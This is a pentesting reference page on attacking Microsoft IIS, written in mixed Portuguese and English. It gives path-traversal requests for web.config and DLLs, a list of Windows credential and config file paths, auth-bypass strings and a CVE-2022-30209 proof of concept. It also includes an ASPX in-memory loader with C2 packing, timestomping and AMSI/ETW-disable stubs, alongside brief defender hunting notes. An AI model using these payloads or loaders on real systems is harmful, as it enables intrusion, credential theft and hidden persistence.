# IIS - Internet Information Services

{{#include ../../banners/hacktricks-training.md}}

Extensões de arquivo executável de teste:

- asp
- aspx
- config
- php

## Divulgação de Endereço IP Interno

Em qualquer servidor IIS onde você receba um 302, você pode tentar remover o cabeçalho Host e usar HTTP/1.0; dentro da resposta o cabeçalho Location pode apontar para o endereço IP interno:
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
Resposta revelando o IP interno:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## Executar arquivos .config

Você pode enviar arquivos .config e usá-los para executar código. One way to do it is appending the code at the end of the file inside an HTML comment: [Download example here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

Mais informações e técnicas para explorar essa vulnerabilidade [here](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## IIS Discovery Bruteforce

Baixe a lista que eu criei:

{{#file}}
iisfinal.txt
{{#endfile}}

Foi criada mesclando o conteúdo das seguintes listas:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

Use-a sem adicionar qualquer extensão, os arquivos que precisam dela já a possuem.

## Path Traversal

### Leaking source code

Confira o writeup completo em: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

> [!TIP]
> As summary, there are several web.config files inside the folders of the application with references to "**assemblyIdentity**" files and "**namespaces**". With this information it's possible to know **where are executables located** and download them.\
> From the **Dlls baixados** it's also possible to find **new namespaces** where you should try to access and get the web.config file in order to find new namespaces and assemblyIdentity.\
> Also, the files **connectionstrings.config** and **global.asax** may contain interesting information.

In **.Net MVC applications**, the **web.config** file plays a crucial role by specifying each binary file the application relies on through **"assemblyIdentity"** XML tags.

### **Explorando Arquivos Binários**

Um exemplo de acesso ao arquivo **web.config** é mostrado abaixo:
```html
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
Esta requisição revela várias configurações e dependências, tais como:

- **EntityFramework** versão
- **AppSettings** para webpages, validação do cliente e JavaScript
- **System.web** configurações para autenticação e runtime
- **System.webServer** configurações de módulos
- **Runtime** vínculos de assembly para várias bibliotecas como **Microsoft.Owin**, **Newtonsoft.Json** e **System.Web.Mvc**

Estas configurações indicam que certos arquivos, como **/bin/WebGrease.dll**, estão localizados dentro da pasta /bin da aplicação.

### **Arquivos do Diretório Raiz**

Arquivos encontrados no diretório raiz, como **/global.asax** e **/connectionstrings.config** (que contém senhas sensíveis), são essenciais para a configuração e operação da aplicação.

### **Namespaces e Web.Config**

Aplicações MVC também definem **arquivos web.config** adicionais para namespaces específicos para evitar declarações repetitivas em cada arquivo, como demonstrado com uma solicitação para baixar outro **web.config**:
```html
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **Baixando DLLs**

A menção de um namespace personalizado sugere uma DLL chamada "**WebApplication1**" presente no diretório /bin. Em seguida, é mostrada uma solicitação para baixar o **WebApplication1.dll**:
```html
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
Isso sugere a presença de outras DLLs essenciais, como **System.Web.Mvc.dll** e **System.Web.Optimization.dll**, no diretório /bin.

Em um cenário em que uma DLL importa um namespace chamado **WebApplication1.Areas.Minded**, um atacante pode inferir a existência de outros arquivos web.config em caminhos previsíveis, como **/area-name/Views/**, contendo configurações específicas e referências para outras DLLs na pasta /bin. Por exemplo, uma requisição para **/Minded/Views/web.config** pode revelar configurações e namespaces que indicam a presença de outra DLL, **WebApplication1.AdditionalFeatures.dll**.

### Arquivos comuns

A partir de [here](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 Error

If you see an error like the following one:

![](<../../images/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

Se você vir um erro como o seguinte:

Significa que o servidor **não recebeu o nome de domínio correto** dentro do cabeçalho Host.\
Para acessar a página web você pode olhar o **certificado SSL** apresentado e talvez encontre o nome de domínio/subdomínio lá. Se não estiver, pode ser necessário **brute force VHosts** até encontrar o correto.

## Decrypt encrypted configuration and ASP.NET Core Data Protection key rings

Dois padrões comuns para proteger segredos em apps .NET hospedados no IIS são:
- ASP.NET Protected Configuration (RsaProtectedConfigurationProvider) para seções do web.config como <connectionStrings>.
- ASP.NET Core Data Protection key ring (persisted locally) usado para proteger segredos da aplicação e cookies.

Se você tiver acesso ao filesystem ou acesso interativo no servidor web, chaves co-localizadas frequentemente permitem a descriptografia.

- ASP.NET (Full Framework) – descriptografar seções de configuração protegidas com aspnet_regiis:
```cmd
# Decrypt a section by app path (site configured in IIS)
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pd "connectionStrings" -app "/MyApplication"

# Or specify the physical path (-pef/-pdf write/read to a config file under a dir)
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pdf "connectionStrings" "C:\inetpub\wwwroot\MyApplication"
```
- ASP.NET Core – procure por Data Protection key rings armazenados localmente (arquivos XML/JSON) em locais como:
- %PROGRAMDATA%\Microsoft\ASP.NET\DataProtection-Keys
- HKLM\SOFTWARE\Microsoft\ASP.NET\Core\DataProtection-Keys (registry)
- App-managed folder (e.g., App_Data\keys or a Keys directory next to the app)

Com o key ring disponível, um operador executando com a identidade do app pode instanciar um IDataProtector com os mesmos purposes e unprotect os segredos armazenados. Misconfigurações que armazenam o key ring junto com os arquivos do app tornam a descriptografia offline trivial assim que o host é comprometido.

## IIS fileless backdoors and in-memory .NET loaders (NET-STAR style)

O toolkit Phantom Taurus/NET-STAR demonstra um padrão maduro para fileless IIS persistence e post‑exploitation inteiramente dentro do w3wp.exe. As ideias centrais são amplamente reutilizáveis para tradecraft customizado e para detection/hunting.

Componentes-chave
- ASPX bootstrapper hosting an embedded payload: uma única página .aspx (por exemplo, OutlookEN.aspx) contém uma .NET DLL codificada em Base64, opcionalmente comprimida com Gzip. Ao receber uma requisição de gatilho ela decodifica, descomprime e carrega reflexivamente a DLL no AppDomain atual e invoca o ponto de entrada principal (por exemplo, ServerRun.Run()).
- Cookie‑scoped, encrypted C2 com empacotamento multi‑estágio: tarefas/resultados são encapsulados com Gzip → AES‑ECB/PKCS7 → Base64 e movidos via requisições aparentemente legítimas com muitos cookies; operadores usavam delimitadores estáveis (por exemplo, "STAR") para chunking.
- Reflective .NET execution: aceita assemblies gerenciadas arbitrárias em Base64, carrega via Assembly.Load(byte[]) e passa argumentos do operador para troca rápida de módulos sem tocar no disco.
- Operating in precompiled ASP.NET sites: adicionar/gerenciar shells/backdoors auxiliares mesmo quando o site está precompilado (por exemplo, o dropper adiciona páginas/handlers dinâmicos ou aproveita config handlers) – exposto por comandos como bypassPrecompiledApp, addshell, listshell, removeshell.
- Timestomping/metadata forgery: expõe uma ação changeLastModified e timestomp no deployment (incluindo timestamps de compilação futuros) para dificultar DFIR.
- Optional AMSI/ETW pre‑disable for loaders: um loader de segunda etapa pode desabilitar AMSI e ETW antes de chamar Assembly.Load para reduzir a inspeção de payloads em memória.

Minimal ASPX loader pattern
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Compression" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e){
// 1) Obtain payload bytes (hard‑coded blob or from request)
string b64 = /* hardcoded or Request["d"] */;
byte[] blob = Convert.FromBase64String(b64);
// optional: decrypt here if AES is used
using(var gz = new GZipStream(new MemoryStream(blob), CompressionMode.Decompress)){
using(var ms = new MemoryStream()){
gz.CopyTo(ms);
var asm = Assembly.Load(ms.ToArray());
// 2) Invoke the managed entry point (e.g., ServerRun.Run)
var t = asm.GetType("ServerRun");
var m = t.GetMethod("Run", BindingFlags.Public|BindingFlags.NonPublic|BindingFlags.Static|BindingFlags.Instance);
object inst = m.IsStatic ? null : Activator.CreateInstance(t);
m.Invoke(inst, new object[]{ HttpContext.Current });
}
}
}
</script>
```
Auxiliares de Packing/crypto (Gzip + AES‑ECB + Base64)
```csharp
using System.Security.Cryptography;

static byte[] AesEcb(byte[] data, byte[] key, bool encrypt){
using(var aes = Aes.Create()){
aes.Mode = CipherMode.ECB; aes.Padding = PaddingMode.PKCS7; aes.Key = key;
ICryptoTransform t = encrypt ? aes.CreateEncryptor() : aes.CreateDecryptor();
return t.TransformFinalBlock(data, 0, data.Length);
}
}

static string Pack(object obj, byte[] key){
// serialize → gzip → AES‑ECB → Base64
byte[] raw = Serialize(obj);                    // your TLV/JSON/msgpack
using var ms = new MemoryStream();
using(var gz = new GZipStream(ms, CompressionLevel.Optimal, true)) gz.Write(raw, 0, raw.Length);
byte[] enc = AesEcb(ms.ToArray(), key, true);
return Convert.ToBase64String(enc);
}

static T Unpack<T>(string b64, byte[] key){
byte[] enc = Convert.FromBase64String(b64);
byte[] cmp = AesEcb(enc, key, false);
using var gz = new GZipStream(new MemoryStream(cmp), CompressionMode.Decompress);
using var outMs = new MemoryStream(); gz.CopyTo(outMs);
return Deserialize<T>(outMs.ToArray());
}
```
Fluxo de Cookie/session e superfície de comandos
- Session bootstrap e tasking são transportados via cookies para se misturar com a atividade web normal.
- Comandos observados no mundo real incluíam: fileExist, listDir, createDir, renameDir, fileRead, deleteFile, createFile, changeLastModified; addshell, bypassPrecompiledApp, listShell, removeShell; executeSQLQuery, ExecuteNonQuery; and dynamic execution primitives code_self, code_pid, run_code para execução em memória .NET.

Utilitário de Timestomping
```csharp
File.SetCreationTime(path, ts);
File.SetLastWriteTime(path, ts);
File.SetLastAccessTime(path, ts);
```
Desabilitar AMSI/ETW inline antes de Assembly.Load (variante loader)
```csharp
// Patch amsi!AmsiScanBuffer to return E_INVALIDARG
// and ntdll!EtwEventWrite to a stub; then load operator assembly
DisableAmsi();
DisableEtw();
Assembly.Load(payloadBytes).EntryPoint.Invoke(null, new object[]{ new string[]{ /* args */ } });
```
Veja AMSI/ETW bypass techniques in: windows-hardening/av-bypass.md

Hunting notes (defenders)
- Página ASPX única e estranha com blobs Base64/Gzip muito longos; posts com muitos cookies.
- Módulos gerenciados não suportados dentro de w3wp.exe; strings como Encrypt/Decrypt (ECB), Compress/Decompress, GetContext, Run.
- Delimitadores repetidos como "STAR" no tráfego; timestamps desalinhados ou até futuros em ASPX/assemblies.

## Vulnerabilidades antigas do IIS que valem a pena procurar


### Microsoft IIS tilde character “\~” Vulnerabilidade/Feature – Short File/Folder Name Disclosure

Você pode tentar enumerar pastas e arquivos dentro de cada pasta descoberta (mesmo que exija Basic Authentication) usando esta técnica.\
A principal limitação desta técnica, se o servidor for vulnerável, é que ela só consegue encontrar até as primeiras 6 letras do nome de cada arquivo/pasta e as primeiras 3 letras da extensão dos arquivos.

Você pode usar [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) para testar esta vulnerabilidade:`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../images/image (844).png>)

Pesquisa original: [https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf](https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf)

Você também pode usar metasploit: `use scanner/http/iis_shortname_scanner`

Uma boa ideia para encontrar o nome final dos arquivos descobertos é pedir opções a LLMs, como é feito no script [https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py](https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py)

### Basic Authentication bypass

Faça bypass de uma autenticação básica (IIS 7.5) tentando acessar: `/admin:$i30:$INDEX_ALLOCATION/admin.php` ou `/admin::$INDEX_ALLOCATION/admin.php`

Você pode tentar combinar esta vulnerabilidade com a anterior para encontrar novas pastas e burlar a autenticação.

## ASP.NET Trace.AXD enabled debugging

O ASP.NET inclui um modo de depuração e seu arquivo é chamado `trace.axd`.

Ele mantém um log muito detalhado de todas as requisições feitas a uma aplicação ao longo do tempo.

Essas informações incluem IPs dos clientes remotos, session IDs, todos os cookies de requisição e resposta, caminhos físicos, informações do código-fonte e potencialmente até nomes de usuário e senhas.

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH Cookie

ASPXAUTH usa as seguintes informações:

- **`validationKey`** (string): chave codificada em hex para usar na validação de assinatura.
- **`decryptionMethod`** (string): (padrão “AES”).
- **`decryptionIV`** (string): vetor de inicialização codificado em hex (padrão é um vetor de zeros).
- **`decryptionKey`** (string): chave codificada em hex para usar na decriptação.

No entanto, algumas pessoas usarão os valores padrão desses parâmetros e usarão como cookie o email do usuário. Portanto, se você encontrar um site usando a mesma plataforma que utiliza o cookie ASPXAUTH e criar um usuário com o email da pessoa que você deseja se passar no servidor alvo, você pode conseguir us**ar o cookie do segundo servidor no primeiro** e se passar pelo usuário.\
Esse ataque funcionou neste [**writeup**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19).

## Bypass de Autenticação do IIS com senhas em cache (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[Full report here](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html): Um bug no código não verificava corretamente a senha fornecida pelo usuário, então um atacante cujo hash de senha corresponda a uma chave já presente no cache conseguirá fazer login como esse usuário.
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
## Referências

- [Unit 42 – Phantom Taurus: Um novo Nexus APT chinês e a descoberta do NET-STAR Malware Suite](https://unit42.paloaltonetworks.com/phantom-taurus/)
- [Contexto do AMSI/ETW bypass (HackTricks)](../../windows-hardening/av-bypass.md)

{{#include ../../banners/hacktricks-training.md}}
